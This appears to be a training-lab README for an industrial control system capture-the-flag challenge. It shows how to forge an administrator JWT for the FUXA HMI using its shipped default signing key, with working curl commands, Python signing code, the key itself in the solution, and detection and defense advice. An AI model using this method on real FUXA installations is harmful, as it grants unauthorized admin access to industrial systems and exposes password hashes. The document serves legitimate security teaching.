# Forged HMI Token

> **MITRE ATT&CK for ICS:** `Persistence`, `Lateral Movement` | [T1694.001 - Insecure Credentials: Default Credentials](https://attack.mitre.org/techniques/T1694/001/) | `Collection` | [T0811 - Data from Information Repositories](https://attack.mitre.org/techniques/T0811/)

## Overview
In the [Password Attack](../password_attack/README.md) challenge you guessed
your way into the FUXA HMI. This time you do not need a password at all.

FUXA, the Human-Machine Interface (HMI) at **172.18.0.4:1881**, does not keep
a list of who is logged in. After a successful login it hands the browser a
**session token**, and every later request carries that token. FUXA believes
whatever the token says ("I am admin") as long as the token's signature is
correct. The signature is made with a secret **signing key**.

FUXA lets the owner set that key in its configuration. If nobody does, it
falls back to a key that is written into its own source code, and FUXA is
open source. Anybody who reads the code can sign tokens FUXA will trust.

Your goal is to **forge an administrator token for a user that does not
exist** and get FUXA to accept it.

## Background

### JSON Web Tokens (JWT)

FUXA's tokens are JSON Web Tokens: three base64url-encoded parts separated by
dots, `header.payload.signature`.

| Part | Contents in FUXA |
|------|------------------|
| header | `{"alg": "HS256", "typ": "JWT"}`: the signature is an HMAC-SHA256 |
| payload | the **claims**: `id` (the user name), `groups` (the role), usually `iat` (issued at) and `exp` (expires) |
| signature | HMAC-SHA256 of `header.payload` with the signing key |

Base64url is not encryption. Anyone can read the payload of a token. What
protects a token is only that nobody without the key can compute a valid
signature for a changed payload. HS256 uses the **same key** to sign and to
check, so whoever knows the key FUXA checks with can also sign.

### Roles in FUXA

The `groups` claim is FUXA's role. The CybICS accounts are `viewer` (1),
`operator` (3) and `admin` (-1). FUXA treats the groups **-1** and **255** as
administrators. The user list, `GET /api/users`, is one of the requests only
an administrator may make: without a valid admin token FUXA answers
`401 Unauthorized`.

### Where the key comes from

FUXA reads `secretCode` from its `settings.js`. In CybICS that line is still
commented out, the way FUXA ships it, so FUXA uses the default from its source
code. That default is the same in every FUXA installation that never set its
own, which makes it a default credential just like a factory password, only
one that nobody types and therefore nobody thinks of changing.

## Where to run it

From the **attack shell** (WebShell view of the landing page, 172.18.0.100)
or the Kali attack machine. Everything below needs only Python's standard
library and `curl`.

## Task

The flag has the format `CybICS(flag)`. Paste your forged token into the
answer field of the challenge page and click **Verify**. The token passes
when:

- FUXA itself accepts it as an **administrator** (it returns the user list);
- its `id` is a user name **no FUXA account has**, so no login can have
  produced it;
- it is **not a token FUXA could have signed itself**. FUXA's own tokens carry
  exactly `id`, `groups`, `iat` and `exp`, valid for 15 minutes, 1 hour,
  3 hours or 1 day. Leave out `iat` and `exp`, or pick a different lifetime.

The last rule exists because FUXA 1.2.6 has a second, unrelated hole: its
token-refresh request signs a token for whatever user and groups the client
names, for any client, without a password and whatever the key is. A token
FUXA signed itself proves nothing about the key; this challenge is about the
key.

### Steps

1. **Look at a real token.** Log in through the API as the viewer (password
   in [the FUXA README](../../software/FUXA/README.md)) and decode the middle
   part of the token:
   ```bash
   curl -s -X POST -H 'Content-Type: application/json' \
        -d '{"username":"viewer","password":"viewer"}' \
        http://172.18.0.4:1881/api/signin
   ```
   Copy the `token` value, then
   ```bash
   python3 -c 'import base64,sys; p=sys.argv[1].split(".")[1]; print(base64.urlsafe_b64decode(p+"=="))' <token>
   ```
   You see the claims FUXA signs: `id`, `groups`, `iat`, `exp`. Note that
   `exp - iat` is FUXA's token lifetime.

2. **Check that the user list is protected.**
   ```bash
   curl -s -o /dev/null -w '%{http_code}\n' http://172.18.0.4:1881/api/users
   curl -s -o /dev/null -w '%{http_code}\n' -H 'x-access-token: <viewer token>' \
        http://172.18.0.4:1881/api/users
   ```
   Both answer `401`: no token, and a viewer token, are not enough.

3. **Find the key.** FUXA is the npm package `@frangoteam/fuxa` (CybICS runs
   version 1.2.6). Its token handling lives in `api/jwt-helper.js`, which you
   can read on GitHub (`frangoteam/FUXA`). Look at how the variable holding
   the key is initialised, and at which value `init()` uses when the settings
   give none. The same default appears, commented out, in FUXA's
   `settings.js` template.

4. **Sign your own token.** Choose a user name that FUXA does not have and
   the administrator group, and sign it with HS256 and the key from step 3:
   ```python
   import base64, hashlib, hmac, json

   def b64(data):
       return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

   key = b"<the key from step 3>"
   header = b64(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
   payload = b64(json.dumps({"id": "<a new name>", "groups": -1}, separators=(",", ":")).encode())
   signature = b64(hmac.new(key, f"{header}.{payload}".encode(), hashlib.sha256).digest())
   print(f"{header}.{payload}.{signature}")
   ```
   Without an `exp` claim the token never expires.

5. **Test it.**
   ```bash
   curl -s -H 'x-access-token: <your token>' http://172.18.0.4:1881/api/users
   ```
   A `200` with the user list, password hashes included, means FUXA treats
   you as an administrator. A `401` means the key or the group is wrong.

6. **Verify.** Paste the token into the challenge page and click **Verify**.

`fuxa_jwt.py` in this directory does steps 2, 4 and 5 for you
(`python3 fuxa_jwt.py --help`).

Do not change anything in FUXA with the token: the HMI is shared with
everyone else on the board. Reading the user list is enough.

## Detect and Defend

### Detection
- The CybICS IDS does **not** see this attack. A forged token travels in an
  ordinary HTTP header of an ordinary `GET` request; nothing in the traffic
  pattern differs from a real administrator.
- FUXA's own log shows each request (`GET /api/users 200`) but not which user
  made it. An application that logged the token's `id` would show a user name
  that is in no user database; that mismatch is the clearest indicator.
- An administrator session that never logged in (no `POST /api/signin` from
  that address) is another sign, if the web server's log is collected.

### Defense
- **Set a signing key of your own.** A long random `secretCode` in
  `settings.js` makes every token signed with the default key worthless. That
  is the [Rotate the FUXA Token Key](../defense_fuxa_jwt/README.md) challenge.
- **Keep the key secret and long.** HS256 keys can be guessed offline: one
  captured token is enough to try millions of keys a second without FUXA
  noticing. A short or dictionary key is barely better than the default.
- **Limit who can reach the HMI.** Only operator stations need port 1881; see
  [Network Segmentation](../defense_network/README.md). In FUXA 1.2.6 this is
  also the only defence against the token-refresh hole mentioned above, which
  a new key does not close; the other fix is a FUXA version or patch that
  verifies the token before refreshing it.
- **Check vendor defaults during commissioning.** Read the configuration
  template of every HMI and web service for keys, tokens and passwords that
  ship with a value, and replace each one.

## Security Framework References

<details>
  <summary>Click to expand</summary>

### MITRE ATT&CK for ICS

| Tactic | Technique | ID | Description |
|--------|-----------|-----|-------------|
| Persistence, Lateral Movement | Insecure Credentials: Default Credentials | [T1694.001](https://attack.mitre.org/techniques/T1694/001/) | FUXA's default signing key is a vendor default the owner is meant to change, and it unlocks the administrator role |
| Collection | Data from Information Repositories | [T0811](https://attack.mitre.org/techniques/T0811/) | The forged session reads the HMI's user database, password hashes included |

The key is a *default* credential rather than a *hardcoded* one
(T1694.002): FUXA lets the owner replace it in `settings.js`. It becomes a
problem only because few owners do.

### MITRE D3FEND - Defensive Countermeasures

| Technique | ID | Description |
|-----------|-----|-------------|
| Credential Rotation | [D3-CRO](https://d3fend.mitre.org/technique/d3f:CredentialRotation/) | Replace the default signing key with one of your own |
| Application Configuration Hardening | [D3-ACH](https://d3fend.mitre.org/technique/d3f:ApplicationConfigurationHardening/) | Set `secretCode` instead of relying on FUXA's built-in default |

### NIST SP 800-82r3 Reference

| Control Family | Controls | Relevance |
|----------------|----------|-----------|
| **Identification and Authentication (IA)** | IA-5 | Authenticator management: change default authenticators, including keys |
| **System and Communications Protection (SC)** | SC-12, SC-23 | Key management and session authenticity |
| **Configuration Management (CM)** | CM-6 | Secure configuration settings instead of shipped defaults |

</details>

## Hints

<details>
  <summary>💡 Hint</summary>

FUXA is open source. When nobody sets a signing key in its settings, which
key does it fall back to, and where in its code is that written down?

</details>

## Solution

<details>
  <summary>Click to expand</summary>

FUXA 1.2.6 initialises the key in `api/jwt-helper.js` with
`var secretCode = 'frangoteam751';` and keeps it when `settings.js` gives
none. From the attack shell:

```bash
cd /CybICS/training/fuxa_jwt
python3 fuxa_jwt.py --user ghost
```

The script prints the user list and the token. Paste the token on the
challenge page and click **Verify**.

</details>
